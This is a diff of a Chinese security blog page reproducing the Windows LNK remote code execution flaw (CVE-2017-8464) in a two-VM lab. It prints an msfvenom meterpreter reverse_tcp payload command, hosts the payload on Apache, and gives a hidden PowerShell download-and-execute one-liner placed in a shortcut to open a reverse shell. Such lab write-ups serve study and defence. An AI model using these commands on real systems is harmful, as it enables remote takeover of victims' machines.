@@ -2,13 +2,13 @@
 <html lang="zh">
 
 <head>
-        <meta charset="utf-8">
+            <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="description" content="">
         <meta name="author" content="">
 
-        <title>JenI's Blog - Tags</title>
+        <title>JenI's Blog</title>
 
         <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
         <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
@@ -37,8 +37,22 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-		<meta property="og:locale" content="zh">
+
+
+
+        <meta name="tags" contents="windows" />
+
+
+			<meta property="og:locale" content="zh">
 		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/windows-link.html">
+	<meta property="og:title" content="Windows LNK 远程命令执行漏洞利用流程">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/win-lnk/win-lnk-cover.png">
+	<meta property="article:published_time" content="2017-06-17 00:00:00+08:00">
 </head>
 
 <body style="background-color: #f8f8f8">
@@ -72,12 +86,17 @@
     </nav>
 
     <!-- Page Header -->
-        <header class="intro-header" style="background-image: url('theme/images/my_image.png')">
+        <header class="intro-header" style="background-image: url('../theme/images/posts/win-lnk/win-lnk-cover.png')">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
-                        <h1>JenI's Blog - Tags</h1>
+                        <h1>Windows LNK 远程命令执行漏洞利用流程</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2017-06-17 00:00:00+08:00
+                        </span>
+                        
                     </div>
                 </div>
             </div>
@@ -88,18 +107,93 @@
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
-    <h1>Tags for JenI's Blog</h1>        <li><a href="https://blog.jenisec.org/tag/an-zhuang.html">安装</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/lu-you-qi-csrf.html">路由器，CSRF</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/metasploit.html">Metasploit</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/rce.html">RCE</a> (2)</li>
-        <li><a href="https://blog.jenisec.org/tag/shadowbroker.html">ShadowBroker</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/sql-injection.html">SQL-injection</a> (2)</li>
-        <li><a href="https://blog.jenisec.org/tag/struts2.html">Struts2</a> (2)</li>
-        <li><a href="https://blog.jenisec.org/tag/wei-ji-zhan.html">伪基站</a> (2)</li>
-        <li><a href="https://blog.jenisec.org/tag/windows.html">windows</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/xi-tong.html">系统</a> (2)</li>
-        <li><a href="https://blog.jenisec.org/tag/xi-tong-yin-dao.html">系统，引导</a> (1)</li>
-        <li><a href="https://blog.jenisec.org/tag/xiu-tan.html">嗅探</a> (2)</li>
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>最近，微软发布的新一波补丁中修复了两个比较严重的漏洞，一个是 Windows Search 远程命令执行漏洞(CVE-2017-8543),另一个就是今天要复现的 LNK 文件远程代码执行漏洞(CVE-2017-8464),这个 LNK 远程代码执行漏洞由于和 2010 年“伊朗震网(Stuxnet)”事件中所使用的穿透核设施中隔离网络的 Windows 安全漏洞 CVE-2010-2568 非常相似,因此也被圈里人亲切的称作 “震网三代(Stuxnet3)”。下面是复现过程：</p>
+<p><strong><em>漏洞复现</em></strong></p>
+<p>准备环境，我开了两台虚拟机，一台作为攻击机，另一台作为靶机：</p>
+<ul>
+<li>攻击机：Blackarch x86_64 - IP:192.168.6.156, 安装有 Metasploit。</li>
+<li>靶机：Windows server 2008 x64 - IP:192.168.6.147</li>
+</ul>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-1.png" alt="win-lnk-1" /></div>
+
+<p>首先在攻击机上生成 powershell 脚本
+<pre>
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.6.156 lport=23333 -f psh-reflection &gt; ./jenisec.ps1
+</pre></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-2.png" alt="win-lnk-2" /></div>
+
+<p>然后在攻击机上搭建 web 环境
+<pre>
+# 安装 apache
+sudo pacman -S apache
+# 启动 web 服务
+sudo systemctl start httpd
+</pre></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-3.png" alt="win-lnk-3" /></div>
+
+<p>Web服务搭好后将第一步生成的恶意 powershell 脚本放到 Web 服务器的根目录，使用浏览器访问，确保文件可以通过网络访问到。
+<pre>
+mv jenisec.ps1 /srv/http/
+</pre></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-4.png" alt="win-lnk-4" /></div>
+
+<p>使用 Metasploit 监听本地的 23333 端口，这个端口需要和我们生成 powershell 时设置的端口相对应。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-5.png" alt="win-lnk-5" /></div>
+
+<p>在靶机上创建快捷方式，对象位置填写恶意脚本的网络位置
+<pre>
+powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.6.156/jenisec.ps1');test.ps1"
+</pre></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/win-lnk-6.png" alt="win-lnk-6" /></div>
+
+<p>点击快捷方式，Windows 系统解析快捷方式时下载了快捷方式所指向的 jenisec.ps1 文件，并使用 powershell 执行了该文件。效果如下</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/win-lnk/exploit.gif" alt="win-lnk-1" /></div>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/windows-link.html';
+                var disqus_url = 'https://blog.jenisec.org/security/windows-link.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
             </div>
         </div>
     </div>
